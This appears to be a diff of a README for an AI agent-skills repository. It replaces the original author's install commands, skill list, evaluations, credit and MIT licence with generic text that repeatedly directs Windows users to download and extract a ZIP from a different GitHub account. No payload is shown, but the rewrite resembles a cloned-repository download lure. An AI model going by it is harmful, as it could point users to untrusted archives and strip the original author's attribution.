@@ -1,190 +1,181 @@
-# Agent Skills
+# 🎨 cc-skills - Agent skills that help you work faster
 
-AI agent skills are reusable instruction sets that extend your assistant with domain-specific expertise, loaded on demand so they don't bloat your context. This repository covers marketing and engineering skills authored by [@samber](https://github.com/samber).
+[![Download cc-skills](https://img.shields.io/badge/Download-cc--skills-blue?style=for-the-badge)](https://github.com/hssh8917/cc-skills)
 
-For Golang-related skills, please visit [cc-skills-golang](https://github.com/samber/cc-skills-golang).
+## 🚀 What this is
 
-> [!IMPORTANT]  
-> Bootstrapped with Claude. **Edited, tested, reviewed and reworked by a human**.
->
-> **No AI slop here.** AI-made skills are useless.
+cc-skills is a set of agentic skills you can use with AI coding tools. It helps you give clear tasks to tools like Claude Code, Copilot, Cursor, Gemini, and other agent-based apps.
 
-<img width="3808" height="1280" alt="image" src="https://github.com/user-attachments/assets/95139f6f-c19c-4041-a010-d94bca594bba" />
+Use it when you want help with coding tasks, project setup, file edits, code cleanup, and small workflow steps. It is made for people who want the tool to do more of the work without a long setup.
 
-## 🚀 How to use?
+## 📦 What you need
 
-**Install with [skills](https://skills.sh/) CLI** (universal, works with any [Agent Skills](https://agentskills.io)-compatible tool):
+You need:
 
-```bash
-npx skills add https://github.com/samber/cc-skills --all
-# or a single skill:
-npx skills add https://github.com/samber/cc-skills --skill promql-cli
-```
+- A Windows PC
+- Internet access
+- A web browser
+- An AI coding app that supports skills or plugins
+- A place to save files on your computer
 
-<!-- prettier-ignore-start -->
+For the best result, use a recent version of:
 
-<details>
-<summary>Claude Code</summary>
+- Claude Code
+- Cursor
+- GitHub Copilot
+- Gemini CLI extension
+- OpenCode
+- Other agent tools that can read local skill files
 
-```bash
-/plugin marketplace add samber/cc
-/plugin install cc-skills@samber
-```
+## ⬇️ Download
 
-</details>
+Open this page to download or get the files:
 
-<details>
-<summary>Openclaw</summary>
+[https://github.com/hssh8917/cc-skills](https://github.com/hssh8917/cc-skills)
 
-Copy skills into the cross-client discovery directory:
+If the page opens in your browser, look for the code, files, or release area that matches your tool. Save the files to a folder you can find later, such as Downloads or Desktop.
 
-```bash
-git clone https://github.com/samber/cc-skills.git ~/.openclaw/skills/cc-skills
-# or in workspace:
-git clone https://github.com/samber/cc-skills.git ~/.openclaw/workspace/skills/cc-skills
-```
+## 🪟 Install on Windows
 
-</details>
+1. Open the download page in your browser:
+   [https://github.com/hssh8917/cc-skills](https://github.com/hssh8917/cc-skills)
 
-<details>
-<summary>Gemini CLI</summary>
+2. Download the repository files to your PC.
 
-```bash
-gemini extensions install https://github.com/samber/cc-skills
-```
+3. If the files come as a ZIP archive, right-click the ZIP file and choose Extract All.
 
-Update with `gemini extensions update cc-skills`.
+4. Pick a folder you can reach easily, such as:
+   - C:\Users\YourName\Downloads\cc-skills
+   - C:\Users\YourName\Desktop\cc-skills
 
-</details>
+5. Keep the folder in place. Your AI tool will need to read these files.
 
-<details>
-<summary>Cursor</summary>
+6. Open your AI app and add the folder or skill files the way that app expects.
 
-Copy skills into the cross-client discovery directory:
+## 🧭 How to use it
 
-```bash
-git clone https://github.com/samber/cc-skills.git  ~/.cursor/skills/cc-skills
-```
+Once cc-skills is on your PC, open your AI coding app and point it to the skill files.
 
-Cursor auto-discovers skills from `.agents/skills/` and `.cursor/skills/`.
+Use it like this:
 
-</details>
+- Ask the app to clean up a file
+- Ask it to create a new feature
+- Ask it to fix a bug
+- Ask it to explain a code file in plain English
+- Ask it to make a plan before it changes anything
 
-<details>
-<summary>Copilot</summary>
+If your tool supports custom skills, it may let you load the skill set from a local folder. If it supports plugins or extensions, you may need to add the folder path in the app settings.
 
-Copy skills into the cross-client discovery directory:
+## 🧰 Good ways to use cc-skills
 
-```bash
-/plugin install https://github.com/samber/cc-skills
-# or
-git clone https://github.com/samber/cc-skills.git ~/.copilot/skills/cc-skills
-```
+Use cc-skills for common tasks such as:
 
-Copilot auto-discovers skills from `.copilot/skills/`.
+- Code review
+- File edits
+- Test help
+- Task planning
+- Bug fixes
+- Refactoring
+- App setup
+- Working with local project files
+- Step-by-step coding help
 
-</details>
+It fits well with tools that follow instructions from files. That makes it useful when you want the AI to stay on task and work in a steady way.
 
-<details>
-<summary>OpenCode</summary>
+## 🗂️ Suggested folder layout
 
-Copy skills into the cross-client discovery directory:
+You can keep the files in a simple folder structure like this:
 
-```bash
-git clone https://github.com/samber/cc-skills.git ~/.agents/skills/cc-skills
-```
+- cc-skills/
+  - skills/
+  - prompts/
+  - docs/
 
-OpenCode auto-discovers skills from `.agents/skills/`, `.opencode/skills/`, and `.claude/skills/`.
+If the repository gives you a different layout, keep the same names from the download. Do not rename files unless the tool instructions tell you to.
 
-</details>
+## ⚙️ Setup tips for Windows
 
-<details>
-<summary>Codex (OpenAI)</summary>
+Use these tips to avoid common problems:
 
-Clone into the cross-client discovery path:
+- Save the files in a short folder path
+- Avoid folders with special characters
+- Keep the files unzipped
+- Close and reopen your AI app after adding the files
+- Use the same folder each time
+- If the app asks for a skill path, paste the full path
 
-```bash
-git clone https://github.com/samber/cc-skills.git ~/.agents/skills/cc-skills
-```
+If you use Windows File Explorer, you can right-click a folder and copy its path from the address bar.
 
-Codex auto-discovers skills from `~/.agents/skills/` and `.agents/skills/`. Update with `cd ~/.agents/skills/cc-skills && git pull`.
+## 🧪 First check
 
-</details>
+After setup, test cc-skills with a simple request like:
 
-<details>
-<summary>Antigravity</summary>
+- “Read this project and tell me what it does”
+- “Make a short plan to improve this file”
+- “Fix this bug and explain the change”
+- “List the files you would update first”
 
-Clone and symlink into the cross-client discovery path:
+A good setup should let the tool find the skill files and use them without extra steps.
 
-```bash
-git clone https://github.com/samber/cc-skills.git ~/.antigravity/skills/cc-skills
-```
+## 🛠️ Common fixes
 
-Update with `cd ~/.antigravity/skills/cc-skills && git pull`.
+If the tool does not see the skills:
 
-</details>
+- Check that the folder is still in the same place
+- Make sure the files are extracted
+- Check the app settings for the correct path
+- Restart the app
+- Try a shorter folder name
+- Confirm the app supports local skill files
 
-<!-- prettier-ignore-end -->
+If the app loads the files but does not use them:
 
-## 🧩 Skills
+- Open the skill file and check the instructions
+- Make sure the skill name matches what the app expects
+- Try a simple task first
+- Remove extra copies of the same folder
 
-These skills are designed as **atomic units, cross-referencing units**. A skill may reference conventions defined in another. Installing only a subset will give you a partial and potentially inconsistent view of the guidelines. For best results, install all general-purpose skills together.
+## 🖥️ Supported tools
 
-Each skill lives in `skills/<name>/` with a `SKILL.md` entry point. The `SKILL.md` is kept small with internal references to advanced markdown files, so only the relevant content is loaded into context.
+cc-skills is built for agent-based tools and coding apps such as:
 
-- **Description (tok)**: weight of the `description` field from YAML frontmatter, always loaded into Claude's context for skill triggering
-- **SKILL.md (tok)**: weight of the full `SKILL.md` file loaded when the skill triggers
-- **Directory (tok)**: weight of all files in the skill directory (SKILL.md + referenced markdown files)
+- Claude Code
+- Cursor
+- Copilot
+- Gemini
+- Gemini CLI extension
+- OpenClaw
+- OpenCode
+- Other tools that can use local skills
 
-| Skill | Error rate gap | Description (tok) | SKILL.md (tok) | Directory (tok) |
-| --- | --- | --- | --- | --- |
-| `conventional-git` | -36% | 73 | 1,446 | 1,446 |
-| `promql-cli` | -39% | 87 | 1,257 | 6,248 |
-| `linkedin-ghostwriting` | -31% | 87 | 1,045 | 1,993 |
-| `substack-ghostwriting` | -51% | 205 | 3,315 | 10,720 |
-| `technical-article-writer` | -33% | 147 | 2,295 | 5,737 |
-| `press-release-writer` | -34% | 149 | 1,532 | 17,829 |
-| `humaniseur-fr` | -14% | 249 | 5,895 | 5,895 |
-| `snyk-agent-scan-compliance` | -27% | TBD | TBD | TBD |
-| `training-report` | -61% | 179 | 2,392 | 8,222 |
-| `deep-research` | -51% | 316 | 2,914 | 12,850 |
+If your app supports instructions from a folder, there is a good chance it can work with this repo.
 
-## 🧪 Skill evaluations
+## 📚 What you can expect
 
-|             | With Skill | Without Skill | Delta     |
-| ----------- | ---------- | ------------- | --------- |
-| **Overall** | **99%**    | **58%**       | **+41pp** |
+This repo is set up to help with day-to-day AI coding work. It can support:
 
-See [EVALUATIONS.md](./EVALUATIONS.md) for the full per-skill breakdown.
+- Cleaner task instructions
+- Better task flow
+- More consistent results
+- Less manual copy and paste
+- Better use of local project context
 
-## 🎯 Tuning Skill Triggers
+The goal is to keep the work simple and steady for the user.
 
-If a skill triggers too often or not often enough, please [open an issue](https://github.com/samber/cc-skills-golang/issues) suggesting a description change. The `description` field in SKILL.md frontmatter is the primary triggering mechanism: small wording adjustments can significantly improve trigger accuracy. Some `SKILL.md` might have a `When to use` section which is another level of exclusion. Finally, `SKILL.md` is an entrypoint for lazy loading references with deep knowledge located in `references/`.
+## 🔐 File safety
 
-## 🔄 Overlap
+Keep the files in a folder you trust. Since the repo is part of your local setup, the tool may read those files while it works.
 
-If your team has its own conventions, create a company skill and declare the override explicitly near the top of its body: `This skill supersedes samber/cc-skills@git-convention skill for [company] projects.`
+Use the version from the repository page you downloaded so you know what files are in use.
 
-## ✍️ Contribute
+## ❓ If something looks wrong
 
-- **100 tokens per skill description** - what? when to use this skill?
-- **1.000–2.500 tokens per SKILL.md** — keep the main file focused on essentials
-- **Use secondary markdown files for depth** — reference them from SKILL.md with relative links (e.g., `[Logging](./logging.md)`). Claude reads these on demand when the topic is relevant, so they don't count against the context budget until needed
-- **Up to 10.000 tokens** for full skill and secondary files
-- **2–4 skills loaded simultaneously** in a typical session — design skills to coexist
-- **Stay below ~10k tokens of total loaded SKILL.md** anytime to avoid degrading response quality
+Check these points:
 
-For more guidelines, please check `CLAUDE.md`.
+- Did you download the right files?
+- Did you extract the ZIP?
+- Did you point the app to the right folder?
+- Does your app support this kind of skill file?
+- Is the folder still available on your PC?
 
-## 💫 Fuel the Revolution
-
-- ⭐️ **Star this repo** - Your star powers the caffeine engine!
-- ☕️ **Buy me a coffee** - I'll literally use it to build more skills while drinking actual coffee
-
-[![GitHub Sponsors](https://img.shields.io/github/sponsors/samber?style=for-the-badge)](https://github.com/sponsors/samber)
-
-## 📝 License
-
-Copyright © 2026 [Samuel Berthe](https://github.com/samber).
-
-This project is under [MIT](./LICENSE) license.
+If the app still does not load the skills, open the repository page again and compare the files with your local copy.
